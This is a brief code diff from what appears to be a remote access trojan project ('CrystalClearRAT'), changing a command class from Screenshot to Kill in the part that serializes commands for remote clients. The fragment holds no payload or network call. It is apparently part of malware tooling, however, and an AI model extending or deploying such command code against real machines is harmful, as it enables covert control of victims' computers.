@@ -8,11 +8,13 @@ using System.Threading.Tasks;
 
 namespace CrystalClearRAT.Functions
 {
-    public static class Screenshot
+    public static class Kill
     {
-        public static byte[] Request(string identifier)
+
+        public static byte[] Request()
         {
-            return CommandDataSerializer.Serialize(CommandFlags.Screenshot, (writer) => { writer.Write(identifier); });
+            return CommandDataSerializer.Serialize(CommandFlags.Kill);
         }
+
     }
 }
